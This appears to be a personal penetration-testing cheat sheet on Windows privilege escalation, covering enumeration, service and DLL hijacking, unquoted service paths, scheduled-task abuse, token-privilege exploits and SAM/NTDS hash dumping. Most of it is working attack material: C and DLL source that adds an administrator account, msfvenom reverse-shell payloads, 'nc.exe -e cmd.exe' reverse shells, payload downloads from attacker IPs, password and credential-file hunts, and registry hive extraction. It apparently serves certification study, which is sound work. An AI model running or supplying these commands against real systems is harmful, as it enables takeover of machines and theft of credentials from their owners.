
Good cheatsheet:
- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

## Manual enumeration

| Command                        | Explanation                                         |
| ------------------------------ | --------------------------------------------------- |
| `whoami`                       | Determine Hostname & Username                       |
| `whoami /groups`               | Display all groups for current user                 |
| `Get-LocalUser`                | List local users                                    |
| `Get-LocalGroup`               | List local groups                                   |
| `Get-LocalGroupMember <group>` | List members in group                               |
| `systeminfo`                   | Gather system info (OS, version, architecture, ...) |
| `ipconfig /all`                | List network interfaces                             |
| `route print `                 | Display routing table                               |
| `netstat -ano`                 | List active network connections                     |
| `Get-Process`                  | Review running processes                            |

Check installed applications: (32-bit)
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Check installed applications: (64-bit)
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Google software and version to look for Local Privilege Escalation attacks:
- E.g. [[Jacko]]


### Check for config files

Locate .kdbx files (keepass database files)
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Find xampp config files:
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
# C:\xampp\passwords.txt
# C:\xampp\mysql\bin\my.ini
```

Search for files with specific extensions in the user's home directory
```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

Check for passwords:
```bash
for /r %d in (*) do @echo %d | findstr /i /v "C:\Windows" > nul && findstr /i "pass" "%d"
```

Non-powershell variant, run in user's home directories to possibly find powershell history files
```bash
dir /s/b C:\*.txt
dir /s/b C:\*.zip
dir /s/b C:\*.doc

# Powershell history
dir /s/b C:\Users\*\*.txt
```

Get subdirectory and file listing in current directory (try in \users directory)
```powershell
tree /f /a
```

**Check for hidden and non standard folders:**
```bash
dir /a
```
>[!info]
>Hidden directories might not be visible in evil-winrm session, use RDP or simple reverse shell paired with `dir /a` to not miss anything (like a .git folder)

>[!warning]
>Check C:\ drive for non standard directories and files!


### Run command as another user

Execute command as other user (requires GUI access)
```powershell
runas /user:backupadmin cmd
```
>[!info]
>Use runascs if no RDP session can be established: [link](https://github.com/antonioCoco/RunasCs)
>


### PS history files

Verify PowerShell history:
```powershell
Get-History
```

Get PSReadline history path: (may cause issues in evil-winrm)
```powershell
(Get-PSReadlineOption).HistorySavePath
cd <dir>
```
>[!info]
>- Read file using cat or type
>- cd into directory as there might be multiple history files


## Automated enumeration

Tools:
- winPEAS
- Seatbelt
- JAWS

Transfer the executable using iwr:
```powershell
iwr -uri http://<IP>/winPEASx64.exe -Outfile winPEAS.exe

# Execute
.\winPEAS.exe
```

PrivescCheck:
- https://github.com/itm4n/PrivescCheck
```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

PowerUp:
```bash
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

SharpUp:
- https://github.com/alexandre-pecorilla/Binaries-Scripts/blob/main/SharpUp.exe
```bash
.\SharpUp.exe audit
```


## Common Attacks

### Service Binary Hijacking

List running services:
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# On non-RDP session:
sc.exe query
sc.exe qc <service>
Get-WmiObject Win32_Service | Select-Object Name, PathName
```

Try to find files that are not in the default directory of `C:\Windows\System32` since these are usually user installed. Using icacls we can retrieve the permissions set: (we are looking for F)
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

| Mask | Permissions           |
| ---- | --------------------- |
| F    | Full access           |
| M    | Modify access         |
| RX   | Read & execute access |
| R    | Read-only access      |
| W    |                       |

C code to create dave2 user that is part of the administrator group:
```c
#include <stdlib.h>

int main()
{
   int i;
   
   i = system ("net user dave2 password123! /add"); 
   i = system ("net localgroup administrators dave2 /add"); 
   return 0; 
}

# Generate same payload using msfvenom:
msfvenom -p windows/adduser USER=<user> PASS=<pass> -f exe -o user.exe 
```

Cross compile the C code:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
>[!warning]
>Check if application is 32 or 64-bit!

Transfer it to the target system (make sure the name is set to mysqld.exe)
```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Try to reboot
net stop <service>
net start <service>
Stop-Service <service>
Start-Service <service>
```

Verify if the service starts on boot:
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | WhereObject {$_.Name -like 'mysql'}
```

Reboot the machine:
```powershell
shutdown /r /t 0
```
>[!info]
>We need SeShutDownPrivilege set (whoami /priv)

Find the same priv-esc vector using PowerUp:
- https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```


### Service DLL Hijacking

Exploit missing DLL, start by enumerating services:
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# On non-RDP session:
sc.exe query
sc.exe qc <service>
Get-WmiObject Win32_Service | Select-Object Name, PathName
```

Check permission on the binary file of the service:
```powershell
icacls .\Documents\BetaServ.exe
```

Identify DLL's loaded by the binary:
- Can be done via Process Monitor (procmon) if Administrator
	- Restart service: `Restart-Service BetaService`
	- Filter: (Look for name not found on the DLL)
		- `Process Name is <executable>.exe then include`
		- `Operation is CreateFile then include`
		- `Path ends with .dll then include`
		- `Result is NAME NOT FOUND then include`
- File can be transfered to own system for inspection
```bash
# Start by transfering the exe and turning it into a service:
sc.exe create "Scheduler" binpath= "C:\Users\offsec\Desktop\Scheduler.exe"

# Now start the service and check in procmon
net start Scheduler
```

List PATH variable:
```powershell
$env:path
```

Create malicious DLL:
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{

	switch ( ul_reason_for_call )
	{
		case DLL_PROCESS_ATTACH: // A process is loading the DLL.
		int i;
		i = system ("net user dave2 password123! /add");
		i = system ("net localgroup administrators dave2 /add");
		break;
		case DLL_THREAD_ATTACH: // A process is creating a new thread.
		break;
		case DLL_THREAD_DETACH: // A thread exits normally.
		break;
		case DLL_PROCESS_DETACH: // A process unloads the DLL.
		break;
	}
	return TRUE;
}

# Can be done using msfvenom
msfvenom -p windows/adduser USER=<user> PASS=<pass> -f dll -o user.dll
```

Cross-compile:
```powershell
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

OR use msfvenom:
```bash
# 32-bit
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f dll > <name>.dll

# 64-bit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f dll > <name>.dll
```
>[!warning]
>Check if application is 32 or 64-bit!

Transfer the DLL and restart the service: (in the same directory as the .exe file)
```powershell
sc.exe stop <service>
sc.exe start <service>
Restart-Service <service>
```


### Unquoted Service Paths

Used with write permissions and if files cannot be replaced.

If the directory path contains spaces and no strings then it can be interpreted in various ways.
```powershell
C:\Program Files\My Program\My Service\service.exe

# Becomes:

C:\Program.exe 
C:\Program Files\My.exe 
C:\Program Files\My Program\My.exe 
C:\Program Files\My Program\My service\service.exe
```

Locate services outside of `C:\Windows\`
```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows\\"
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

Verify if we can start & stop the service:
```powershell
Stop-Service GammaService
Start-Service GammaService
```

Check permissions of path:
```powershell
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

We have write permissions on the last path. We will create a malicious file named `Current.exe`. Transfer the payload and restart the service
>[!warning]
>Check if application is 32 or 64-bit!

##### PowerUp:

Identify vulnerable service
```powershell
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```

Exploit:
```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

Restart-Service GammaService
```
--> `john:Password123!`


### Scheduled Tasks

Checklist:
- Which user account (principal) executes this task?
- What triggers are specified for the task?
- What actions are executed on one or more triggers?
- Check C:\ for exe's

List scheduled tasks: (**check Author**)
```powershell
schtasks /query /fo LIST /v > sched.txt
# Transfer to Kali
cat sched.txt | grep "Task To Run" | grep -v "system32\|COM\|System32"

-- OR --

Get-ScheduledTask
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Replace the executable that is called by the scheduled task:
```powershell
iwr -Uri http://<ip>/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```


### Use exploits

Look for outdated software running as an elevated user:
```powershell
# 32-bit
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64-bit
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Kernel exploits
```bash
systeminfo

# Look for missing patches
wmic qfe list
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }

# Get windows build number
[environment]::OSVersion.Version
```
>[!info]
>Use buildnumber here: [src](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)

Wesng usage:
- https://github.com/bitsadmin/wesng
```bash
# On Windows 
systeminfo > systeminfo.txt

# On Kali
python3 wes.py systeminfo.txt
```
>[!info]
>Try Sherlock & Watson too
>- [Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)
>- [Watson](https://github.com/NyaMeeEain/Privilege-Escalation-Windows)


### Special privileges

#### SeImpersonate

PrintSpoofer:
- https://github.com/itm4n/PrintSpoofer/releases
```bash
# Spawn shell
.\PrintSpoofer64.exe -i -c powershell.exe

# Execute reverse shell
.\PrintSpoofer64.exe -c "shell.exe"

# Add user
.\PrintSpoofer64.exe -c "adduser.exe"

# NC reverse shell
.\PrintSpoofer64.exe -c "nc.exe <IP> <port> -e cmd.exe"

# Modify admin user's password
.\PrintSpoofer64.exe -c "cmd /c net user Administrator Password123!"
```

GodPotato
- https://github.com/BeichenDream/GodPotato/releases
```bash
# Execute reverse shell
.\GodPotato-NET4.exe -cmd "shell.exe"

# Add user
.\GodPotato-NET4.exe -cmd "adduser.exe"

# NC reverse shell
.\GodPotato-NET4.exe -cmd "nc.exe <IP> <port> -e cmd.exe"

# Modify admin user's password
.\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Password123!"
```

Juicypotato
- https://github.com/ohpe/juicy-potato/releases
- https://github.com/ivanitlearning/Juicy-Potato-x86/releases
```bash
.\Juicy-Potato-x86.exe -l 1337 -p "shell.exe" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```
>[!info]
>CLSID based on OS: [link](https://github.com/ohpe/juicy-potato/tree/master/CLSID/)


#### SeBackup

Dumping SAM & SYSTEM hive from registry:
```bash
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive

# Dump hashes using secretsdump
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Using diskshadow:
```bash
# Create script on Kali
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup

# Convert to msdos format
unix2dos script.txt

# Transfer script and use diskshadow
diskshadow.exe /s script.txt

# Transfer ntds.dit from the E:\ drive to the current folder
robocopy /b E:\Windows\ntds . ntds.dit

# Download ntds.dit
download ntds.dit

# Download system hive from registry
mkdir C:\temp
reg save hklm\system C:\temp\system.hive
download system

# Dump NTLM hashes using secretsdump
impacket-secretsdump -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL
```

DLL abuse allowing us to read any file on the system (can be used to dump SYSTEM & SAM):
- https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
```bash
Import-Module .\\SeBackupPrivilegeUtils.dll
Import-Module .\\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege \<PATH>\proof.txt .\proof.txt
```


#### SeRestore

SeRestoreAbuse.exe:
- https://github.com/alexandre-pecorilla/Binaries-Scripts
```bash
.\SeRestoreAbuse.exe C:\users\public\shell.exe
```


#### SeManageVolume

The following PoC allows us to gain complete control over the filesystem:
- https://github.com/CsEnox/SeManageVolumeExploit/releases
```bash
.\SeManageVolumeExploit.exe
```

To become the administrator user we can follow this guide:
- https://github.com/xct/SeManageVolumeAbuse/tree/main?tab=readme-ov-file
```bash
# Transfer reverse shell DLL named tzres.dll to C:\windows\system32\wbem 
iwr -uri http://192.168.45.237/shell.dll -OutFile tzres.dll

# Run the systeminfo command to get a shell as network service
systeminfo

# Abuse SeImpersonate
.\godpotato.exe -cmd "shell.exe"
```


#### Service accounts - regain permissions 

On service level accounts we can regain our original permissions using FullPowers.exe:
- https://github.com/itm4n/FullPowers/releases
```bash
# Using reverse shell
.\FullPowers.exe -c "shell.exe"

# Using NC
.\FullPowers.exe -c "nc.exe <IP> <port> -e cmd.exe"
```



## Other techniques
### Writable webserver shares

Start by checking if the webserver is running as another user, for this we can check if a user like web_svc exists:
```bash
net user
```

If the webroot directory is writable we can add a simple reverse shell to become web_svc:
```bash
PS C:\xampp\htdocs> iwr -uri http://192.168.45.240/shell.php -OutFile shell.php
```
>[!info]
>Webroot depends on server configuration
>- inetpub
>- xampp htdocs
>- ...


### Writable C:\ drive

This can be the result of a successful SeManageVolumeAbuse exploitation or a phpMyAdmin session running as the SYSTEM user:
- SeManageVolume writeup: [[Access]]
- phpMyAdmin writeup: [[Craft2]]


Unattended windows installation:
```bash
dir /s _sysprep.inf_ sysprep.xml _unattended.xml_ unattend.xml *unattended.txt 2>null
```